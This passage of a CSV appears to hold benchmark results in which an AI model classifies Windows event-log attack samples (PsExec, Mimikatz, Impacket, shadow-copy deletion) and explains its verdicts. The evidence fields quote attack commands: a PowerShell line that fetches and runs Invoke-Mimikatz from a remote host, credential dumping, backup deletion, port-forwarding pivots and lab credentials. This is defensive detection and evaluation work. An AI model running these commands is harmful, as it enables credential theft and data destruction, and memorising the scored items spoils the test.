+- Registry: None
+
+EXPLANATION:
+The sequence shows a classic PsExec lateral movement attack: remote Kerberos logons (Type 3) from 10.23.42.22, writing PSEXESVC.exe to the ADMIN$ share, service creation (4697) running as LocalSystem, and execution of PSEXESVC.exe spawning cmd.exe with cleartext credentials passed on the command line (""-u demo\admmig -p Admin1235""). Subsequent reconnaissance commands (whoami, hostname) confirm hands-on-keyboard discovery activity following the remote code execution."
+claude-opus-4-8,ID4688-4648 Lateral movement with net use.evtx,easy,A,processed,YES,100.0,90.0,YES,"4688, 4648",C:\Windows\System32\net.exe,"admmig, hack1",net  use m: \\fs03vuln\c$ /USER:offsec\hack1,"\\fs03vuln\c$, fs03vuln.offsec.lan, cifs/fs03vuln.offsec.lan",,0.0,4.74,5.4,5.0,4.0,3,17.4,A,"MALICIOUS: YES
+
+EVIDENCE:
+- Event IDs: 4688, 4648
+- Processes: C:\Windows\System32\net.exe
+- Accounts: admmig, hack1
+- Commands: net  use m: \\fs03vuln\c$ /USER:offsec\hack1
+- Network: \\fs03vuln\c$, fs03vuln.offsec.lan, cifs/fs03vuln.offsec.lan
+- Registry: None
+
+EXPLANATION:
+The account admmig mapped an administrative C$ share on fs03vuln using explicit alternate credentials for the account hack1 (Event 4648 explicit credential logon paired with the net use admin-share command in Event 4688). The use of explicit credentials to access an administrative C$ share with a different account is a common lateral movement pattern indicating credential misuse rather than routine activity."
+claude-opus-4-8,ID13-RDP shadow session configuration enabled (registry).evtx,easy,A,processed,YES,100.0,88.9,YES,12,C:\Windows\system32\reg.exe,,,,HKLM\SOFTWARE\Policies\Microsoft\Windows NT\Terminal Services,0.0,3.14,5.3,6.0,4.0,4,19.3,A,"MALICIOUS: YES
+
+EVIDENCE:
+- Event IDs: 12
+- Processes: C:\Windows\system32\reg.exe
+- Accounts: None
+- Commands: None
+- Network: None
+- Registry: HKLM\SOFTWARE\Policies\Microsoft\Windows NT\Terminal Services
+
+EXPLANATION:
+The event shows reg.exe creating/modifying a registry key under Terminal Services policy, tagged with technique T1076 (Remote Desktop Protocol). This activity is consistent with an attacker enabling or manipulating RDP settings to establish remote access persistence, which is a known lateral movement and persistence technique."
+claude-opus-4-8,ID5600-proxy configuration changed.evtx,easy,A,processed,YES,100.0,71.4,YES,5600,,,,"http://hacker-proxy.lan:123, http://hacker-bypass.com/, http://internal.lan;<local>",,0.0,4.05,4.3,6.0,4.0,3,17.3,A,"MALICIOUS: YES
+
+EVIDENCE:
+- Event IDs: 5600
+- Processes: None
+- Accounts: None
+- Commands: None
+- Network: http://hacker-proxy.lan:123, http://hacker-bypass.com/, http://internal.lan;<local>
+- Registry: None
+
+EXPLANATION:
+Repeated proxy configuration changes redirect WinINet traffic through ""http://hacker-proxy.lan:123"" and set a malicious auto-config (PAC) URL ""http://hacker-bypass.com/"", consistent with attacker-controlled traffic interception/redirection. The escalating sequence of paired changes (setting proxy, then auto-config URL, then bypass lists) on the same host indicates deliberate man-in-the-middle/exfiltration setup rather than routine configuration."
+claude-opus-4-8,ID4688-netsh RDP port forwarding abuse.evtx,easy,A,processed,YES,100.0,100.0,YES,"1102, 4688, 4964, 4672, 4624, 4627","C:\Windows\System32\netsh.exe, C:\Windows\System32\cmd.exe","admmig, FS01$","netsh  I p a v l=8001 listena=0.0.0.0 connectp=3389 c=1.1.1.1, netsh  interface portproxy add v4tov4 listenaddress=0.0.0.0 listenport=48333 connectaddress=127.0.0.1 connectport=80, netsh  interface portproxy reset","0.0.0.0, 3389, 1.1.1.1, 127.0.0.1, 10.23.23.9",,0.0,6.65,6.0,6.0,4.0,4,20.0,A,"MALICIOUS: YES
+
+EVIDENCE:
+- Event IDs: 1102, 4688, 4964, 4672, 4624, 4627
+- Processes: C:\Windows\System32\netsh.exe, C:\Windows\System32\cmd.exe
+- Accounts: admmig, FS01$
+- Commands: netsh  I p a v l=8001 listena=0.0.0.0 connectp=3389 c=1.1.1.1, netsh  interface portproxy add v4tov4 listenaddress=0.0.0.0 listenport=48333 connectaddress=127.0.0.1 connectport=80, netsh  interface portproxy reset
+- Network: 0.0.0.0, 3389, 1.1.1.1, 127.0.0.1, 10.23.23.9
+- Registry: None
+
+EXPLANATION:
+The security log was cleared (Event 1102) immediately before a series of netsh portproxy commands were run, indicating anti-forensic activity followed by network pivoting setup. The portproxy rules forward external traffic to RDP (3389) and local services, a classic lateral movement/tunneling technique, executed by the privileged account admmig with extensive sensitive privileges (SeDebugPrivilege, SeImpersonatePrivilege). The combination of log clearing, privilege escalation, and port forwarding strongly indicates malicious post-compromise behavior."
+claude-opus-4-8,ID4688-Delete VSS backup (WMI).evtx,easy,A,processed,YES,100.0,100.0,YES,4688,"C:\Windows\System32\wbem\WMIC.exe, C:\Windows\System32\VSSVC.exe, C:\Windows\System32\svchost.exe","admmig, FS03$","wmic  shadowcopy delete /nointeractive, C:\Windows\system32\vssvc.exe, C:\Windows\System32\svchost.exe -k swprv",,,0.0,4.76,6.0,5.0,4.0,3,18.0,A,"MALICIOUS: YES
+
+EVIDENCE:
+- Event IDs: 4688
+- Processes: C:\Windows\System32\wbem\WMIC.exe, C:\Windows\System32\VSSVC.exe, C:\Windows\System32\svchost.exe
+- Accounts: admmig, FS03$
+- Commands: wmic  shadowcopy delete /nointeractive, C:\Windows\system32\vssvc.exe, C:\Windows\System32\svchost.exe -k swprv
+- Network: None
+- Registry: None
+
+EXPLANATION:
+The account admmig executed ""wmic shadowcopy delete /nointeractive"", which deletes Volume Shadow Copies to prevent file recovery — a hallmark of ransomware and anti-recovery (defense evasion) behavior. The subsequent VSSVC.exe and svchost.exe -k swprv processes are the Volume Shadow Service components invoked to carry out the deletion, confirming the destructive action succeeded."
+claude-opus-4-8,ID4688-Delete Window backup (webadmin).evtx,easy,A,processed,YES,100.0,100.0,YES,"1102, 4688","C:\Windows\System32\wbadmin.exe, C:\Windows\System32\wbem\WMIADAP.exe, C:\Windows\System32\wbem\WmiPrvSE.exe","admmig, FS03$","wbadmin  delete backup -backupTarget:m:\ -deleteOldest, wmiadap.exe /R /T, C:\Windows\system32\wbem\wmiprvse.exe -Embedding",,,0.0,6.64,6.0,6.0,4.0,3,19.0,A,"MALICIOUS: YES
+
+EVIDENCE:
+- Event IDs: 1102, 4688
+- Processes: C:\Windows\System32\wbadmin.exe, C:\Windows\System32\wbem\WMIADAP.exe, C:\Windows\System32\wbem\WmiPrvSE.exe
+- Accounts: admmig, FS03$
+- Commands: wbadmin  delete backup -backupTarget:m:\ -deleteOldest, wmiadap.exe /R /T, C:\Windows\system32\wbem\wmiprvse.exe -Embedding
+- Network: None
+- Registry: None
+
+EXPLANATION:
+The security log was cleared (Event 1102) by account admmig, immediately followed by that same account running wbadmin.exe to delete backups, both classic anti-recovery and anti-forensic techniques. The pairing of log clearing with backup deletion within seconds strongly indicates ransomware/destructive attack preparation rather than routine administration."
+claude-opus-4-8,ID800-4103-4104-Delete VSS backup (PowerShell).evtx,easy,A,processed,YES,100.0,91.7,YES,"800, 4104, 4103",C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,OFFSEC\admmig,Get-WmiObject Win32_Shadowcopy | ForEach-Object {$_.Delete() | },,,0.0,5.85,5.5,5.0,4.0,2,16.5,B,"MALICIOUS: YES
+
+EVIDENCE:
+- Event IDs: 800, 4104, 4103
+- Processes: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
+- Accounts: OFFSEC\admmig
+- Commands: Get-WmiObject Win32_Shadowcopy | ForEach-Object {$_.Delete();}
+- Network: None
+- Registry: None
+
+EXPLANATION:
+The user OFFSEC\admmig executed a PowerShell command to enumerate and delete all Volume Shadow Copies via WMI (Win32_Shadowcopy $_.Delete()). Deleting shadow copies is a well-known anti-recovery technique used by ransomware to prevent victims from restoring files, and serves no legitimate routine administrative purpose in this context."
+claude-opus-4-8,ID4728-Massive account group membership change.evtx,easy,A,processed,YES,100.0,100.0,YES,4728,,"lambda-user, hack-adm-hack, Group01, Group02, Group03, Group04, Group05, Group06, Group07, Group08, Group09, Group10, Group11",,,,0.0,5.12,6.0,6.0,4.0,3,19.0,A,"MALICIOUS: YES
+
+EVIDENCE:
+- Event IDs: 4728
+- Processes: None
+- Accounts: lambda-user, hack-adm-hack, Group01, Group02, Group03, Group04, Group05, Group06, Group07, Group08, Group09, Group10, Group11
+- Commands: None
+- Network: None
+- Registry: None
+
+EXPLANATION:
+A single account (lambda-user) added the same member (hack-adm-hack) to 11 different security groups (Group01-Group11) within milliseconds, indicating automated/scripted mass group enrollment rather than normal administrative activity. The suspicious naming of the added member (""hack-adm-hack"") combined with rapid sequential additions across many groups is consistent with privilege escalation and persistence behavior."
+claude-opus-4-8,"4624,4674,4688- CrackMap Exec SMB mimikatz.evtx",easy,B,processed,YES,100.0,72.8,YES,"4624, 4674, 4688","cmd.exe, powershell.exe, conhost.exe, services.exe, WmiPrvSE.exe","ANONYMOUS LOGON, admmig, FS03VULN$","cmd.exe /Q /c powershell.exe -exec bypass -noni -nop -w 1 -C, IEX (New-Object Net.WebClient).DownloadString('https://10.23.123.11:2626/Invoke-Mimikatz.ps1'), Invoke-Mimikatz -Command 'privilege::debug sekurlsa::logonpasswords exit', C:\Windows\SYSTEM32\cmd.exe /c ""C:\tools\shell.cmd""",10.23.123.11,"\REGISTRY\MACHINE\SYSTEM\ControlSet001\Services\WinSock2\Parameters, \REGISTRY\MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\PERFLIB",0.0,8.61,4.4,6.0,4.0,4,18.4,A,"MALICIOUS: YES
+
+EVIDENCE:
+- Event IDs: 4624, 4674, 4688
+- Processes: cmd.exe, powershell.exe, conhost.exe, services.exe, WmiPrvSE.exe
+- Accounts: ANONYMOUS LOGON, admmig, FS03VULN$
+- Commands: cmd.exe /Q /c powershell.exe -exec bypass -noni -nop -w 1 -C, IEX (New-Object Net.WebClient).DownloadString('https://10.23.123.11:2626/Invoke-Mimikatz.ps1'), Invoke-Mimikatz -Command 'privilege::debug sekurlsa::logonpasswords exit', C:\Windows\SYSTEM32\cmd.exe /c ""C:\tools\shell.cmd""
+- Network: 10.23.123.11
+- Registry: \REGISTRY\MACHINE\SYSTEM\ControlSet001\Services\WinSock2\Parameters, \REGISTRY\MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\PERFLIB
+
+EXPLANATION:
+The logs show an obfuscated PowerShell command (character-array encoded) launched via cmd.exe that disables SSL certificate validation and downloads/executes Invoke-Mimikatz from 10.23.123.11:2626 to dump credentials (sekurlsa::logonpasswords), a clear credential-theft attack. This was preceded by ANONYMOUS LOGON and NTLM authentication from the same source IP, and followed by execution of a suspicious C:\tools\shell.cmd, consistent with lateral movement and post-exploitation. The combination of obfuscation, Mimikatz download, and remote payload retrieval confirms malicious activity."
+claude-opus-4-8,ID325-327-IFM created - ESENT.evtx,easy,A,processed,YES,100.0,100.0,YES,"216, 325, 327","lsass, NTDS",,,,,0.0,4.05,6.0,6.0,4.0,3,19.0,A,"MALICIOUS: YES
+
+EVIDENCE:
+- Event IDs: 216, 325, 327
+- Processes: lsass, NTDS
+- Accounts: None
+- Commands: None
+- Network: None
+- Registry: None
+
+EXPLANATION:
+The logs show ntds.dit (the Active Directory database) being accessed via a volume shadow copy (\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy5 and C:\$SNAP_202106051936_VOLUMEC$) and copied to attacker-controlled paths like ""c:\hacker\Active Directory\ntds.dit"". This shadow-copy extraction of the NTDS database is a classic domain controller credential-theft technique used to harvest all domain account hashes offline."
+claude-opus-4-8,ID3-7-10-Suspicious DLL loaded (CME+Mimikatz).evtx,easy,A,processed,YES,100.0,100.0,YES,"7, 3, 10","C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe, C:\Windows\system32\lsass.exe",OFFSEC\admmig,,"10.23.42.38, 10.23.123.11",,0.0,5.15,6.0,6.0,4.0,4,20.0,A,"MALICIOUS: YES
+
+EVIDENCE:
+- Event IDs: 7, 3, 10
+- Processes: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe, C:\Windows\system32\lsass.exe
+- Accounts: OFFSEC\admmig
+- Commands: None
+- Network: 10.23.42.38, 10.23.123.11
+- Registry: None
+
+EXPLANATION:
+PowerShell (process 2668) loaded System.Management.Automation and WMI modules, then opened a handle to lsass.exe with GrantedAccess 0x143A, which is consistent with credential dumping (LSASS memory access). The same process also initiated repeated outbound TCP connections to 10.23.123.11 over port 443, suggesting C2 or exfiltration following the credential access activity. This chain of PowerShell-driven LSASS access plus outbound connections by OFFSEC\admmig indicates malicious post-exploitation behavior."
+claude-opus-4-8,ID4704-4705-User righ assigned to account.evtx,easy,A,processed,YES,100.0,100.0,YES,"4704, 4705",,admmig,,,,0.0,5.24,6.0,5.0,4.0,2,17.0,A,"MALICIOUS: YES
+
+EVIDENCE:
+- Event IDs: 4704, 4705
+- Processes: None
+- Accounts: admmig
+- Commands: None
+- Network: None
+- Registry: None
+
+EXPLANATION:
+The same actor (admmig, LogonId 0x202DAC8) repeatedly assigns and removes a chain of highly sensitive user rights (SeCreateTokenPrivilege, SeAssignPrimaryTokenPrivilege, SeCreateSymbolicLinkPrivilege, SeDebugPrivilege, SeImpersonatePrivilege) to the same target SID (-1158) within minutes. This rapid grant/revoke cycling of token-manipulation and debug privileges is a classic privilege-escalation/token-abuse pattern rather than routine administration, especially since these specific rights enable credential theft and process injection."
+claude-opus-4-8,ID4661-SAM sensitive domain users & groups discovery.evtx,easy,A,processed,YES,100.0,100.0,YES,4661,C:\Windows\System32\lsass.exe,"admmig, OFFSEC",,,,0.0,7.24,6.0,5.0,4.0,2,17.0,A,"MALICIOUS: YES
+
+EVIDENCE:
+- Event IDs: 4661
+- Processes: C:\Windows\System32\lsass.exe
+- Accounts: admmig, OFFSEC
+- Commands: None
+- Network: None
+- Registry: None
+
+EXPLANATION:
+The account ""admmig"" performed rapid, sequential SAM object access against the domain controller (rootdc1.offsec.lan), enumerating SAM_SERVER, SAM_DOMAIN, the Domain Admins group (RID 512), Domain Users (RID 513), and Builtin domain with full control access masks (0xF01FF). This systematic enumeration of privileged groups and user objects via direct SAM access is consistent with Active Directory reconnaissance/credential-harvesting (DCSync-style or domain enumeration) activity rather than routine administration. The tight clustering of handle requests across server, domain, group, and user objects within seconds indicates automated tooling targeting privileged identities."
+claude-opus-4-8,ID5140-ADMIN$ share connection with Golden ticket.evtx,easy,A,processed,YES,100.0,77.8,YES,5140,,"not_existing_user, admmig",,10.23.23.9,,0.0,4.00,4.7,6.0,4.0,4,18.7,A,"MALICIOUS: YES
+
+EVIDENCE:
+- Event IDs: 5140, 5140
+- Processes: None
+- Accounts: not_existing_user, admmig
+- Commands: None
+- Network: 10.23.23.9
+- Registry: None
+
+EXPLANATION:
+Two administrative share accesses (ADMIN$ and IPC$) originate from the same source IP 10.23.23.9 within roughly one minute, a pattern consistent with lateral movement / remote execution tooling. The first access uses an account named ""not_existing_user"" tied to the built-in Administrator RID (-500), which is highly suspicious and indicative of a spoofed or anomalous logon, while access to ADMIN$ and IPC$ is a hallmark of remote command execution techniques."
+claude-opus-4-8,ID4732-4733-Quick added-removed user from local group.evtx,easy,A,processed,YES,100.0,100.0,YES,"4732, 4733",,"admmig, Users, Administrators, Backup Operators",,,,0.0,3.82,6.0,6.0,4.0,4,20.0,A,"MALICIOUS: YES
+
+EVIDENCE:
+- Event IDs: 4732, 4733
+- Processes: None
+- Accounts: admmig, Users, Administrators, Backup Operators
+- Commands: None
+- Network: None
+- Registry: None
+
+EXPLANATION:
+The same local member SID (S-1-5-21-1470532092-3758209836-3742276719-1001) was added by admmig to privileged groups Administrators and Backup Operators within minutes, then quickly removed (4733) from those same groups. This rapid add-then-remove of a single account into high-privilege groups is a classic privilege escalation and cleanup pattern designed to gain backup/admin rights temporarily while minimizing footprint, indicating malicious activity."
+claude-opus-4-8,ID1-CrackMapExec payload execution.evtx,easy,B,processed,YES,100.0,75.0,YES,1,"cmd.exe, powershell.exe, WmiPrvSE.exe",OFFSEC\admmig,"cmd.exe /Q /c powershell.exe -exec bypass -noni -nop -w 1 -C "" -JOIN('91A78H101...').sPlIT('@A@GkTfSH,' )|%{([iNt] $_ -AS [char])})| .( $ENv:comsPec[4,26,25]-JOIn'')"", $cmd = Invoke-Mimikatz -Command 'privilege::debug sekurlsa::logonpasswords exit'","10.23.123.11:443, https://10.23.123.11:443/Invoke-Mimikatz.ps1",,0.0,7.74,4.5,6.0,4.0,4,18.5,A,"MALICIOUS: YES
+
+EVIDENCE:
+- Event IDs: 1
+- Processes: cmd.exe, powershell.exe, WmiPrvSE.exe, wmiprvse.exe
+- Accounts: OFFSEC\admmig
+- Commands: cmd.exe /Q /c powershell.exe -exec bypass -noni -nop -w 1 -C "" -JOIN('91A78H101...').sPlIT('@A@GkTfSH,' )|%{([iNt] $_ -AS [char])})| .( $ENv:comsPec[4,26,25]-JOIn'')"", $cmd = Invoke-Mimikatz -Command 'privilege::debug sekurlsa::logonpasswords exit'
+- Network: 10.23.123.11:443, https://10.23.123.11:443/Invoke-Mimikatz.ps1
+- Registry: None
+
+EXPLANATION:
+A WmiPrvSE.exe parent spawning cmd.exe and an obfuscated high-integrity PowerShell process indicates remote WMI-based execution, a common lateral movement/attack technique. The decoded payload downloads Invoke-Mimikatz.ps1 from 10.23.123.11 and runs sekurlsa::logonpasswords to dump credentials, with execution-policy bypass and obfuscation (char-array join, $ENv:comsPec) to evade detection. This is clearly malicious credential-theft activity."
+claude-opus-4-8,"ID4656, 5145, 4674-Impacket secret dump via SMB.evtx",easy,A,processed,YES,100.0,85.0,YES,"1102, 4964, 4672, 4624, 5140, 5145, 4674, 4656, 4658","C:\Windows\System32\services.exe, C:\Windows\System32\lsass.exe","admmig, LOCAL SERVICE, FS03VULN$",,"10.23.23.9, 10.23.123.11",,0.0,7.95,5.1,6.0,4.0,4,19.1,A,"MALICIOUS: YES
+
+EVIDENCE:
+- Event IDs: 1102, 4964, 4672, 4624, 5140, 5145, 4674, 4656, 4658
+- Processes: C:\Windows\System32\services.exe, C:\Windows\System32\lsass.exe
+- Accounts: admmig, LOCAL SERVICE, FS03VULN$
+- Commands: None
+- Network: 10.23.23.9, 10.23.123.11
+- Registry: None
+
+EXPLANATION:
+This is a classic Impacket-based remote attack chain: the security log was cleared (1102) followed by remote authenticated access over IPC$ to svcctl, winreg, and samr pipes, plus SAM_SERVER access via lsass.exe — indicative of secretsdump/credential dumping. Temporary files (SYSTEM32\BTeHLZkJ.tmp, NMdzZfem.tmp) written to ADMIN$ are hallmark Impacket service-execution artifacts, and the attacker even saved a file literally named ""Impacket secret dump.evtx"" on the desktop. The combination of log clearing, SeDebug/SeTakeOwnership privileges, remote pipe access, and SAM access confirms malicious credential-theft activity."
+claude-opus-4-8,ID4688-5145-WMIexec execution via SMB.evtx,easy,A,processed,YES,100.0,90.0,YES,"1102, 4964, 4672, 4624, 4688, 4674, 5140, 5145","C:\Windows\System32\cmd.exe, C:\Windows\System32\conhost.exe","admmig, FS03VULN$, LOCAL SERVICE","cmd.exe /Q /c cd \ 1> \\127.0.0.1\ADMIN$\__1619090610.0007844 2>&1, cmd.exe /Q /c cd  1> \\127.0.0.1\ADMIN$\__1619090610.0007844 2>&1, \??\C:\Windows\system32\conhost.exe 0xffffffff","10.23.23.9, 10.23.123.11, 127.0.0.1",,0.0,15.03,5.4,6.0,4.0,4,19.4,A,"MALICIOUS: YES
+
+EVIDENCE:
+- Event IDs: 1102, 4964, 4672, 4624, 4688, 4674, 5140, 5145
+- Processes: C:\Windows\System32\cmd.exe, C:\Windows\System32\conhost.exe
+- Accounts: admmig, FS03VULN$, LOCAL SERVICE
+- Commands: cmd.exe /Q /c cd \ 1> \\127.0.0.1\ADMIN$\__1619090610.0007844 2>&1, cmd.exe /Q /c cd  1> \\127.0.0.1\ADMIN$\__1619090610.0007844 2>&1, \??\C:\Windows\system32\conhost.exe 0xffffffff
+- Network: 10.23.23.9, 10.23.123.11, 127.0.0.1
+- Registry: None
+
+EXPLANATION:
+The Security event log was cleared (Event 1102) by admmig immediately before remote SMB activity, a classic anti-forensic indicator. The cmd.exe commands redirecting output to \\127.0.0.1\ADMIN$\__<timestamp> via the ADMIN$ share are the signature of Impacket smbexec/psexec-style remote command execution, followed by extensive remote enumeration of the C$ share and exfiltration access to ""SMB exec.evtx"". The combination of log clearing, ADMIN$ output-file execution pattern, and privileged remote SMB access confirms malicious lateral movement and remote code execution."
+claude-opus-4-8,ID4717-4718-System security granded to account.evtx,easy,A,processed,NO,100.0,100.0,YES,"4717, 4718",,admmig,,,,0.0,4.06,6.0,2.0,4.0,4,16.0,B,"MALICIOUS: NO
+
+EVIDENCE:
+- Event IDs: 4717, 4718
+- Processes: None
+- Accounts: admmig
+- Commands: None
+- Network: None
+- Registry: None
+
+EXPLANATION:
+These paired events show the same actor (admmig) first assigning (4717) and then removing (4718) the SeDenyServiceLogonRight on the same target SID (...-1158), which is consistent with routine user rights administration or account migration activity. The right being managed is a ""deny"" logon right, which restricts rather than escalates access, and there is no privilege escalation, suspicious process, or network indicator present. This pattern reflects normal account configuration management rather than malicious behavior."
